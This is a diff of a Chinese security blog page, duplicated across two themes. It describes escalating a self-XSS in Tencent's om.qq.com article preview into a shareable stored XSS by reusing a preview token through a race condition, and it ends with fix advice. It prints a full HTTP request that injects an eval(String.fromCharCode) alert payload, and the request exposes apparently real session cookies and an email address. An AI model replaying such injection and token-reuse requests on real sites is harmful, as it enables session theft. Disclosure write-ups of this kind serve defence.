+<p>&#x6210;&#x529F;&#x5F39;&#x7A97;~ So&#xFF0C;&#x63A8;&#x6D4B;<br>&#x4EE3;&#x7801;&#x903B;&#x8F91;&#xFF1A;&#x5BA2;&#x6237;&#x7AEF; -&gt; &#x524D;&#x7AEF;&#x8FDB;&#x884C;&#x7F16;&#x7801; -&gt; &#x670D;&#x52A1;&#x5668;&#x63A5;&#x53D7;&#x53C2;&#x6570;&#x65F6;(&#x672A;&#x8FC7;&#x6EE4;)<br>&#x4E8E;&#x662F; &#x901A;&#x8FC7; &#x5BA2;&#x6237;&#x7AEF; -&gt; &#x524D;&#x7AEF;&#x8FDB;&#x884C;&#x7F16;&#x7801; -&gt; &#x901A;&#x8FC7;&#x4E2D;&#x95F4;&#x4EBA;&#x4FEE;&#x6539;&#x53C2;&#x6570; -&gt; &#x53D1;&#x9001; -&gt; &#x670D;&#x52A1;&#x5668;&#x63A5;&#x53D7; -&gt; &#x6E32;&#x67D3;&#x5230;&#x9875;&#x9762;&#x89E6;&#x53D1;XSS</p>
+<p>&#x4F46;&#x662F;&#x5FC3;&#x60F3;&#x8FD9;&#x53EA;&#x662F;&#x4E2A;&#x9884;&#x89C8;&#x754C;&#x9762;&#xFF0C;&#x65E0;&#x6CD5;&#x4EA4;&#x4E92;&#x9053;&#xFF0C;&#x522B;&#x4EBA;&#x662F;&#x6CA1;&#x529E;&#x6CD5;&#x8BBF;&#x95EE;&#x7684;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;SELF-XSS&#xFF0C;&#x5229;&#x7528;&#x7387;&#x4E0D;&#x9AD8;&#xFF0C;&#x90A3;&#x6211;&#x5C31;&#x53D1;&#x5E03;&#x4E0A;&#x7EBF;&#x5427;&#xFF0C;&#x5229;&#x7528;&#x540C;&#x6837;&#x6D41;&#x7A0B; </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kuaibao.qq.com/s/20181101A10YRL00</span><br></pre></td></tr></table></figure>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-2d0d3ab0cea43c0f49244238fc5c1c51.png!small" alt=""></p>
-<p>心想mmp，发布上线的后端在接受数据的时候，直接进行替换了，导致没办法利用…. 这个问题让我纠结了很久，睡觉睡觉。</p>
-<p>咦，不是预览处还有个二维码吗？二维码里面一定有个可以外部访问的链接，然后用手机打开</p>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-69dc95ec8c7e5b25103d3f32b215fecf.png!small" alt=""></p>
-<p>获得以下链接：<br><code>https://om.qq.com/open/preview?articleId=20181101A10A4T&amp;token=59354A0D09336BE940DB6A9A2EF32D38</code></p>
-<p>….  竟然还带token，并且token带有时间值，失效了就生成新的token，腾讯的同学真是良心用苦了。</p>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-d6fd5c4cab52b722e2130fba345f0367.png!small" alt=""></p>
-<p>但是就因为如此，存在了一些缺陷， 只要是在token没有失效的前提下， 无论怎么(重新)预览发布出去token还是原先的token值，所以可以通过条件竞争来维持会话的固定性，使得链接可以一直被访问。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /article/saveAndPreview?relogin=§1§ HTTP/1.1</span><br><span class="line">Host: om.qq.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://om.qq.com/article/articlePublish</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 467</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: TSID=flncmls3hsc30ihqn15363qn16; _qpsvr_localtk=0.5534494737035368; pgv_pvi=3438402560; pgv_si=s2581188608; ptui_loginuin=xiaoxuan339449639@163.com; wxky=1; omtoken=6cdb5bf845; omtoken_expire=1541077196; fname=%E5%8D%81%E9%87%8C%E6%9C%9B%E6%B5%B7; fimgurl=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_ls%2F0%2F5927755268_200200%2F0; userid=13550050; alertclicked=%7C%7C; rmod=1; pgv_info=ssid=s4945033110; ts_last=om.qq.com/article/articleManage; pgv_pvid=554507366; ts_uid=9880183784; tvfe_boss_uuid=d7a07c30dcda956a; 9e67236d07bdc7152e6e2b42b7f00f43=0bc53b88ec4021e7cddd3d738402d33535846c07a%253A4%253A%257Bi%253A0%253Bs%253A8%253A%252213550050%2522%253Bi%253A1%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bi%253A2%253Bi%253A43200%253Bi%253A3%253Ba%253A15%253A%257Bs%253A6%253A%2522status%2522%253Bi%253A2%253Bs%253A5%253A%2522email%2522%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bs%253A9%253A%2522logintype%2522%253Bi%253A1%253Bs%253A3%253A%2522uin%2522%253BN%253Bs%253A5%253A%2522phone%2522%253BN%253Bs%253A4%253A%2522wxid%2522%253BN%253Bs%253A6%253A%2522imgurl%2522%253Bs%253A55%253A%2522http%253A%252F%252Finews.gtimg.com%252Fnewsapp_ls%252F0%252F5927755268_200200%252F0%2522%253Bs%253A4%253A%2522name%2522%253Bs%253A12%253A%2522%25E5%258D%2581%25E9%2587%258C%25E6%259C%259B%25E6%25B5%25B7%2522%253Bs%253A10%253A%2522isVerified%2522%253Bb%253A1%253Bs%253A10%253A%2522isRejected%2522%253Bb%253A0%253Bs%253A9%253A%2522agreeAcpt%2522%253Bb%253A1%253Bs%253A6%253A%2522pwdChg%2522%253Bb%253A0%253Bs%253A9%253A%2522avatarChg%2522%253Bb%253A0%253Bs%253A2%253A%2522lk%2522%253Bs%253A24%253A%2522aFWX5zYL69tXvF97f3DLiQ00%2522%253Bs%253A2%253A%2522id%2522%253Bs%253A8%253A%252213550050%2522%253B%257D%257D</span><br><span class="line"></span><br><span class="line">title=c1y2m3&amp;title2=&amp;tag=&amp;video=&amp;cover_type=1&amp;imgurl_ext=%5B%7B%7D%5D&amp;category_id=&amp;content=1&apos;&#125;;eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41));var pass=&#123;&apos;id&apos;: &apos;1&amp;orignal=0&amp;user_original=0&amp;music=&amp;activity=&amp;apply_olympic_flag=0&amp;apply_push_flag=0&amp;apply_reward_flag=0&amp;reward_flag=0&amp;survey_id=&amp;survey_name=&amp;articleId=20181101A1AC67&amp;summary=&amp;conclusion=&amp;type=0&amp;commodity=&amp;pushInfo=&amp;is_commercial=0&amp;media=13550050</span><br></pre></td></tr></table></figure>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-e5431b2b2d26227d24194de0cfbee8e1.png!small" alt=""></p>
-<p>腾讯让人头疼的skey,可跨域打cookie，危害不能小视~<br><img src="http://i.3001.net/uploads/Up_imgs/20181101-0ddd2eae3bd7ba416f8a94e0441d0753.png!small" alt=""></p>
-<p>0x02 修复建议：</p>
-<p>   原先自己觉得可以 session  == token ，每次发布的session 都不同， 后端判断 token = session ，但这不适合用于 这种场景，而是用于CSRF、 也是自己对条件竞争不太了解。</p>
-<p>1、后端对预览处进行过滤吧，XSS修复这种方法这里就不再提了。<br>2、对应条件竞争， 后端对发送请求时间间隔进行限制，也是最简单暴力的，但是同时又影响了用户的体验，正牌的方法是多线程加锁，并发（时间间隔极小）请求时，前一个线程的请求还未处理完时，开始处理第二个线程，后续的代码还没判断时第二个线程的请求也得到了处理，导致多个线程资源竞争问题 ，这个之后还要仔细研究一下。</p>
+<p><a class="magnific-img" href="http://i.3001.net/uploads/Up_imgs/20181101-2d0d3ab0cea43c0f49244238fc5c1c51.png!small"><img src="http://i.3001.net/uploads/Up_imgs/20181101-2d0d3ab0cea43c0f49244238fc5c1c51.png!small" alt="" class="ui centered image"></a></p>
+<p>&#x5FC3;&#x60F3;mmp&#xFF0C;&#x53D1;&#x5E03;&#x4E0A;&#x7EBF;&#x7684;&#x540E;&#x7AEF;&#x5728;&#x63A5;&#x53D7;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x76F4;&#x63A5;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#x4E86;&#xFF0C;&#x5BFC;&#x81F4;&#x6CA1;&#x529E;&#x6CD5;&#x5229;&#x7528;&#x2026;. &#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x8BA9;&#x6211;&#x7EA0;&#x7ED3;&#x4E86;&#x5F88;&#x4E45;&#xFF0C;&#x7761;&#x89C9;&#x7761;&#x89C9;&#x3002;</p>
+<p>&#x54A6;&#xFF0C;&#x4E0D;&#x662F;&#x9884;&#x89C8;&#x5904;&#x8FD8;&#x6709;&#x4E2A;&#x4E8C;&#x7EF4;&#x7801;&#x5417;&#xFF1F;&#x4E8C;&#x7EF4;&#x7801;&#x91CC;&#x9762;&#x4E00;&#x5B9A;&#x6709;&#x4E2A;&#x53EF;&#x4EE5;&#x5916;&#x90E8;&#x8BBF;&#x95EE;&#x7684;&#x94FE;&#x63A5;&#xFF0C;&#x7136;&#x540E;&#x7528;&#x624B;&#x673A;&#x6253;&#x5F00;</p>
+<p><a class="magnific-img" href="http://i.3001.net/uploads/Up_imgs/20181101-69dc95ec8c7e5b25103d3f32b215fecf.png!small"><img src="http://i.3001.net/uploads/Up_imgs/20181101-69dc95ec8c7e5b25103d3f32b215fecf.png!small" alt="" class="ui centered image"></a></p>
+<p>&#x83B7;&#x5F97;&#x4EE5;&#x4E0B;&#x94FE;&#x63A5;&#xFF1A;<br><code>https://om.qq.com/open/preview?articleId=20181101A10A4T&amp;token=59354A0D09336BE940DB6A9A2EF32D38</code></p>
+<p>&#x2026;.  &#x7ADF;&#x7136;&#x8FD8;&#x5E26;token&#xFF0C;&#x5E76;&#x4E14;token&#x5E26;&#x6709;&#x65F6;&#x95F4;&#x503C;&#xFF0C;&#x5931;&#x6548;&#x4E86;&#x5C31;&#x751F;&#x6210;&#x65B0;&#x7684;token&#xFF0C;&#x817E;&#x8BAF;&#x7684;&#x540C;&#x5B66;&#x771F;&#x662F;&#x826F;&#x5FC3;&#x7528;&#x82E6;&#x4E86;&#x3002;</p>
+<p><a class="magnific-img" href="http://i.3001.net/uploads/Up_imgs/20181101-d6fd5c4cab52b722e2130fba345f0367.png!small"><img src="http://i.3001.net/uploads/Up_imgs/20181101-d6fd5c4cab52b722e2130fba345f0367.png!small" alt="" class="ui centered image"></a></p>
+<p>&#x4F46;&#x662F;&#x5C31;&#x56E0;&#x4E3A;&#x5982;&#x6B64;&#xFF0C;&#x5B58;&#x5728;&#x4E86;&#x4E00;&#x4E9B;&#x7F3A;&#x9677;&#xFF0C; &#x53EA;&#x8981;&#x662F;&#x5728;token&#x6CA1;&#x6709;&#x5931;&#x6548;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C; &#x65E0;&#x8BBA;&#x600E;&#x4E48;(&#x91CD;&#x65B0;)&#x9884;&#x89C8;&#x53D1;&#x5E03;&#x51FA;&#x53BB;token&#x8FD8;&#x662F;&#x539F;&#x5148;&#x7684;token&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x6765;&#x7EF4;&#x6301;&#x4F1A;&#x8BDD;&#x7684;&#x56FA;&#x5B9A;&#x6027;&#xFF0C;&#x4F7F;&#x5F97;&#x94FE;&#x63A5;&#x53EF;&#x4EE5;&#x4E00;&#x76F4;&#x88AB;&#x8BBF;&#x95EE;&#x3002;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /article/saveAndPreview?relogin=&#xA7;1&#xA7; HTTP/1.1</span><br><span class="line">Host: om.qq.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://om.qq.com/article/articlePublish</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 467</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: TSID=flncmls3hsc30ihqn15363qn16; _qpsvr_localtk=0.5534494737035368; pgv_pvi=3438402560; pgv_si=s2581188608; ptui_loginuin=xiaoxuan339449639@163.com; wxky=1; omtoken=6cdb5bf845; omtoken_expire=1541077196; fname=%E5%8D%81%E9%87%8C%E6%9C%9B%E6%B5%B7; fimgurl=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_ls%2F0%2F5927755268_200200%2F0; userid=13550050; alertclicked=%7C%7C; rmod=1; pgv_info=ssid=s4945033110; ts_last=om.qq.com/article/articleManage; pgv_pvid=554507366; ts_uid=9880183784; tvfe_boss_uuid=d7a07c30dcda956a; 9e67236d07bdc7152e6e2b42b7f00f43=0bc53b88ec4021e7cddd3d738402d33535846c07a%253A4%253A%257Bi%253A0%253Bs%253A8%253A%252213550050%2522%253Bi%253A1%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bi%253A2%253Bi%253A43200%253Bi%253A3%253Ba%253A15%253A%257Bs%253A6%253A%2522status%2522%253Bi%253A2%253Bs%253A5%253A%2522email%2522%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bs%253A9%253A%2522logintype%2522%253Bi%253A1%253Bs%253A3%253A%2522uin%2522%253BN%253Bs%253A5%253A%2522phone%2522%253BN%253Bs%253A4%253A%2522wxid%2522%253BN%253Bs%253A6%253A%2522imgurl%2522%253Bs%253A55%253A%2522http%253A%252F%252Finews.gtimg.com%252Fnewsapp_ls%252F0%252F5927755268_200200%252F0%2522%253Bs%253A4%253A%2522name%2522%253Bs%253A12%253A%2522%25E5%258D%2581%25E9%2587%258C%25E6%259C%259B%25E6%25B5%25B7%2522%253Bs%253A10%253A%2522isVerified%2522%253Bb%253A1%253Bs%253A10%253A%2522isRejected%2522%253Bb%253A0%253Bs%253A9%253A%2522agreeAcpt%2522%253Bb%253A1%253Bs%253A6%253A%2522pwdChg%2522%253Bb%253A0%253Bs%253A9%253A%2522avatarChg%2522%253Bb%253A0%253Bs%253A2%253A%2522lk%2522%253Bs%253A24%253A%2522aFWX5zYL69tXvF97f3DLiQ00%2522%253Bs%253A2%253A%2522id%2522%253Bs%253A8%253A%252213550050%2522%253B%257D%257D</span><br><span class="line"></span><br><span class="line">title=c1y2m3&amp;title2=&amp;tag=&amp;video=&amp;cover_type=1&amp;imgurl_ext=%5B%7B%7D%5D&amp;category_id=&amp;content=1&apos;};eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41));var pass={&apos;id&apos;: &apos;1&amp;orignal=0&amp;user_original=0&amp;music=&amp;activity=&amp;apply_olympic_flag=0&amp;apply_push_flag=0&amp;apply_reward_flag=0&amp;reward_flag=0&amp;survey_id=&amp;survey_name=&amp;articleId=20181101A1AC67&amp;summary=&amp;conclusion=&amp;type=0&amp;commodity=&amp;pushInfo=&amp;is_commercial=0&amp;media=13550050</span><br></pre></td></tr></table></figure>
+<p><a class="magnific-img" href="http://i.3001.net/uploads/Up_imgs/20181101-e5431b2b2d26227d24194de0cfbee8e1.png!small"><img src="http://i.3001.net/uploads/Up_imgs/20181101-e5431b2b2d26227d24194de0cfbee8e1.png!small" alt="" class="ui centered image"></a></p>
+<p>&#x817E;&#x8BAF;&#x8BA9;&#x4EBA;&#x5934;&#x75BC;&#x7684;skey,&#x53EF;&#x8DE8;&#x57DF;&#x6253;cookie&#xFF0C;&#x5371;&#x5BB3;&#x4E0D;&#x80FD;&#x5C0F;&#x89C6;~<br><a class="magnific-img" href="http://i.3001.net/uploads/Up_imgs/20181101-0ddd2eae3bd7ba416f8a94e0441d0753.png!small"><img src="http://i.3001.net/uploads/Up_imgs/20181101-0ddd2eae3bd7ba416f8a94e0441d0753.png!small" alt="" class="ui centered image"></a></p>
+<p>0x02 &#x4FEE;&#x590D;&#x5EFA;&#x8BAE;&#xFF1A;</p>
+<p>   &#x539F;&#x5148;&#x81EA;&#x5DF1;&#x89C9;&#x5F97;&#x53EF;&#x4EE5; session  == token &#xFF0C;&#x6BCF;&#x6B21;&#x53D1;&#x5E03;&#x7684;session &#x90FD;&#x4E0D;&#x540C;&#xFF0C; &#x540E;&#x7AEF;&#x5224;&#x65AD; token = session &#xFF0C;&#x4F46;&#x8FD9;&#x4E0D;&#x9002;&#x5408;&#x7528;&#x4E8E; &#x8FD9;&#x79CD;&#x573A;&#x666F;&#xFF0C;&#x800C;&#x662F;&#x7528;&#x4E8E;CSRF&#x3001; &#x4E5F;&#x662F;&#x81EA;&#x5DF1;&#x5BF9;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x4E0D;&#x592A;&#x4E86;&#x89E3;&#x3002;</p>
+<p>1&#x3001;&#x540E;&#x7AEF;&#x5BF9;&#x9884;&#x89C8;&#x5904;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x5427;&#xFF0C;XSS&#x4FEE;&#x590D;&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x63D0;&#x4E86;&#x3002;<br>2&#x3001;&#x5BF9;&#x5E94;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#xFF0C; &#x540E;&#x7AEF;&#x5BF9;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x8FDB;&#x884C;&#x9650;&#x5236;&#xFF0C;&#x4E5F;&#x662F;&#x6700;&#x7B80;&#x5355;&#x66B4;&#x529B;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x540C;&#x65F6;&#x53C8;&#x5F71;&#x54CD;&#x4E86;&#x7528;&#x6237;&#x7684;&#x4F53;&#x9A8C;&#xFF0C;&#x6B63;&#x724C;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x52A0;&#x9501;&#xFF0C;&#x5E76;&#x53D1;&#xFF08;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x6781;&#x5C0F;&#xFF09;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x524D;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x8BF7;&#x6C42;&#x8FD8;&#x672A;&#x5904;&#x7406;&#x5B8C;&#x65F6;&#xFF0C;&#x5F00;&#x59CB;&#x5904;&#x7406;&#x7B2C;&#x4E8C;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x540E;&#x7EED;&#x7684;&#x4EE3;&#x7801;&#x8FD8;&#x6CA1;&#x5224;&#x65AD;&#x65F6;&#x7B2C;&#x4E8C;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x8BF7;&#x6C42;&#x4E5F;&#x5F97;&#x5230;&#x4E86;&#x5904;&#x7406;&#xFF0C;&#x5BFC;&#x81F4;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x8D44;&#x6E90;&#x7ADE;&#x4E89;&#x95EE;&#x9898; &#xFF0C;&#x8FD9;&#x4E2A;&#x4E4B;&#x540E;&#x8FD8;&#x8981;&#x4ED4;&#x7EC6;&#x7814;&#x7A76;&#x4E00;&#x4E0B;&#x3002;</p>
 
-  </div>
-</article>
+                        
+                    </div>
 
+                    
+                    
+                    
 
+                    <div class="description post-description">
+    <span class="post-description-item">
+        <time datetime="2018-11-01T15:03:00.000Z" itemprop="datePublished">2018-11-01</time>
 
+    </span>
+    <span class="post-description-item">
         
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&text=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&title=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&is_video=false&description=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=从SELF-XSS到存储型XSS/附绕过token分析过程&body=Check out this article: http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&title=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&title=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&title=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&title=从SELF-XSS到存储型XSS/附绕过token分析过程"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /&name=从SELF-XSS到存储型XSS/附绕过token分析过程&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+    </span>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy; 2019 John Doe
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </nav>
-  </div>
-</footer>
+                </div>
+                
+                <div id="pagination" class="nav-web ui text container pagination">
+
+    <div class="ui stackable two column divided grid container">
+        <div class="row">
+            <div class="column nav-left">
+                
+
+                <a href="/c1y2m3.github.io/2018/11/14/如何有效防御CSRF/" class="ui tiny button">
+
+                    <i class="angle left icon"></i>
+                    
+                    如何有效防御CSRF
+                    
+
+                </a>
+
+                
+            </div>
+            <div class="column nav-right">
+                
+
+                <a href="/c1y2m3.github.io/2018/10/18/浅谈跨站脚本绕过和防御/" class="ui tiny button">
+                    
+                    浅谈跨站脚本绕过和防御
+                    
+                    <i class="angle right icon"></i></a>
+                
+            </div>
+        </div>
+    </div>
+
+</div>
+                
+            </div>
+
+            
+            <div class="three wide computer three wide tablet column">
+
+                <div class="ui sticky article-toc" id="article-toc">
+                    <!-- toc -->
+                    
+                </div>
+
+            </div>
+            
+
+        </div>
+    </div>
+</div>
+
+
+                    <!--</div>-->
+                <!--</div>-->
+            <!--</div>-->
+        </div>
+        <div class="ui vertical footer segment">
+    <div class="ui center aligned container">
+        <div class="ui inverted section divider"></div>
+        &copy; 2019 <a href="/">John Doe</a>,
+        Powered by <a href="https://github.com/henryhuang/hexo-theme-aloha" target="_blank">Aloha</a> and <a href="http://hexo.io/" target="_blank">Hexo</a>.
+    </div>
+</div>
 
     </div>
+
+
+
+
+<!-- scripts list from theme config.yml -->
+
+<script src="//cdn.bootcss.com/jquery/3.1.0/jquery.min.js"></script>
+
+<script src="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.js"></script>
+
+<script src="//cdn.bootcss.com/algoliasearch/3.18.1/algoliasearch.min.js"></script>
+
+<script src="//cdn.bootcss.com/algoliasearch-helper-js/2.13.0/algoliasearch.helper.min.js"></script>
+
+<script src="/c1y2m3.github.io/js/semantic-ui-algolia.js"></script>
+
+<script src="/c1y2m3.github.io/js/aloha-events.js"></script>
+
+
+
 </body>
 </html>
-<!-- styles -->
-<link rel="stylesheet" href="/c1y2m3.github.io/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/c1y2m3.github.io/lib/justified-gallery/css/justifiedGallery.min.css">
-
-<!-- jquery -->
-<script src="/c1y2m3.github.io/lib/jquery/jquery.min.js"></script>
-<script src="/c1y2m3.github.io/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-<script src="/c1y2m3.github.io/js/main.js"></script>
-<!-- search -->
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
-
-<!-- Disqus Comments -->
-
-
